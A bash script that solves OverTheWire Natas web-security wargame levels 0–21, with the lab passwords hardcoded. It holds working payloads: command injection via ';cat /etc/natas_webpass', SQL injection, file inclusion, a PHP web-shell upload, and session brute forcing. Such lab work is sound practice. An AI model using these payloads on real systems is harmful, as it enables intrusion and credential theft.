#!/usr/bin/bash

if [ $# -ne 1 ]; then
  echo "usage: ./natas.sh <level>"
  exit 1
else
  case $1 in
    "0") # level 0: natas0
      curl --silent --user natas0:natas0 \
      http://natas0.natas.labs.overthewire.org | \
      awk '/natas1 is/ {print $6}'
      ;;
    "1") # level 1: gtVrDuiDfck831PqWsLEZy5gyDz1clto
      curl --silent --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto \
      http://natas1.natas.labs.overthewire.org | \
      awk '/natas2 is/ {print $6}'
      ;;
    "2") # level 2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
      curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi \
      http://natas2.natas.labs.overthewire.org/files/users.txt | \
      grep -oP '(?<=natas3:).*'
      ;;
    "3") # level 3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
      curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 \
      http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | \
      cut -d ':' -f 2
      ;;
    "4") # level 4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
      curl --silent \
      --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ \
      --referer http://natas5.natas.labs.overthewire.org/ \
      http://natas4.natas.labs.overthewire.org/ | \
      awk '/natas5 is/ {print $8}'
      ;;
    "5") # level 5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
      curl --silent \
      --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq \
      --cookie loggedin=1 \
      http://natas5.natas.labs.overthewire.org/ | \
      awk '/natas6 is/ {print $8}' | rev | cut -c 7- | rev
      ;;
    "6") # level 6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
      curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 \
      http://natas6.natas.labs.overthewire.org/includes/secret.inc | \
      sed -n 2p | grep -oP '(?<=").*?(?=")' | \
      curl --silent \
      --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 \
      --request POST \
      --data "secret=$(</dev/stdin)&submit=Submit+Query" \
      http://natas6.natas.labs.overthewire.org/ | \
      awk '/natas7 is/ {print $8}'
      ;;
    "7") # level 7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
      curl --silent --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 \
      http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 | \
      sed -n 19p\
      ;;
    "8") # level 8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
      curl --silent \
      --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe \
      --request POST \
      --data "secret=$(python -c \
                'print("3d3d516343746d4d6d6c315669563362".decode("hex"))' | \
                rev | base64 -d)&\
              submit=Submit+Query" \
      http://natas8.natas.labs.overthewire.org/ | \
      awk '/natas9 is/ {print $8}'
      ;;
    "9") # level 9: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
      curl --silent \
      --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl \
      --request POST \
      --form 'needle=";cat /etc/natas_webpass/natas10"; submit=Search' \
      http://natas9.natas.labs.overthewire.org/ | \
      sed -n 21p
      ;;
    "10") # level 10: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
      curl --silent \
      --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu \
      --request POST \
      --form "needle=x /etc/natas_webpass/natas11; submit=Search" \
      http://natas10.natas.labs.overthewire.org/ | \
      sed -n 23p | cut -d ':' -f 2
      ;;
    "11") # level 11: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
      curl --silent \
      --user natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK \
      --request POST \
      --form "needle=x /etc/natas_webpass/natas12; submit=Search" \
      --cookie data=$(php xor_encrypt.php) \
      http://natas11.natas.labs.overthewire.org/ | \
      awk '/natas12 is/ {print $6}' | rev | cut -c 5- | rev
      ;;
    "12") # level 12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
      curl --silent \
      --user natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 \
      --request POST \
      --form "filename=reverse_shell.php; MAX_FILE_SIZE=1000" \
      --form "uploadedfile=@reverse_shell.php; submit=Upload+File" \
      http://natas12.natas.labs.overthewire.org/ | \
      grep -oP '(?<=upload\/).*?(?=")' | head -n 1 | \
      curl --silent --user natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 \
      http://natas12.natas.labs.overthewire.org/upload/$(</dev/stdin)?cmd=cat+/etc/natas_webpass/natas13 | \
      tail -n 1
      ;;
    "13") # level 13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
      curl --silent \
      --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
      http://natas13.natas.labs.overthewire.org/ \
      --request POST \
      --form 'filename=reverse_shell.php; MAX_FILE_SIZE=1000' \
      --form 'uploadedfile=@./reverse_shell.php; submit=Upload+File' | \
      grep -oP '(?<=upload\/).*?(?=")' | head -n 1 | \
      curl --silent --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY  \
      http://natas13.natas.labs.overthewire.org/upload/$(</dev/stdin)?cmd=cat+/etc/natas_webpass/natas14 | \
      tail -n 1
      ;;
    "14") # level 14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
      curl --silent \
      --user natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
      --request POST \
      --data 'username=" or 1=1 #' \
      http://natas14.natas.labs.overthewire.org/ | \
      awk '/natas15 is/ {print $8}' | rev | cut -c 9- | rev
      ;;
    "15") # level 15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
      ./helper15.sh
      ;;
    "16") # level 16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
      ./helper16.sh
      ;;
    "17") # level 17: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
      ./helper17.sh
      ;;
    "18") # level 18: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
      for i in {0..640};
      do
        result=$(curl -s -u natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP \
                 http://natas18.natas.labs.overthewire.org/ -b "PHPSESSID=$i" | \
                 grep -oP "(?<=Password: ).*(?=<\/pre>)")

        if [ -n "$result" ]; then
          echo $result
          break
        fi
      done
      ;;
    "19") # level 19: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
      for i in {000..999};
      do
        result=$(curl -s -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs \
                 http://natas19.natas.labs.overthewire.org/ \
                 -b "PHPSESSID=3${i:0:1}3${i:1:1}3${i:2:1}2d61646d696e" | \
                 grep -oP "(?<=Password: ).*(?=<\/pre>)")

        if [ -n "$result" ]; then
          echo $result
          break
        fi
      done
      ;;
    "20") # level 20: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
      curl --silent \
      --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF \
      --cookie PHPSESSID=me \
      http://natas20.natas.labs.overthewire.org/?name=admin%0Aadmin%201 \
      >/dev/null

      curl --silent \
      --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF \
      --cookie PHPSESSID=me \
      http://natas20.natas.labs.overthewire.org/?name=admin%0Aadmin%201 | \
      grep  -oP "(?<=Password: ).*(?=<\/pre>)"
      ;;
    "21") # level 21: IFekPyrQXftziDEsUr3x21sYuahypdgJ
      cookie=$(curl -s -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ \
               http://natas21.natas.labs.overthewire.org/ -c - | \
               tail -n 1 | awk '/SSID/ {print $7}')

      curl --silent \
      --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ \
      --request POST \
      --data "align=center&fontsize=100%&bgcolor=yellow&submit=Update&admin=1" \
      --cookie PHPSESSID=$cookie \
      http://natas21-experimenter.natas.labs.overthewire.org/ >/dev/null

      curl --silent \
      --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ \
      --cookie PHPSESSID=$cookie \
      http://natas21.natas.labs.overthewire.org/ | \
      grep  -oP "(?<=Password: ).*(?=<\/pre>)"
      ;;
  esac
fi

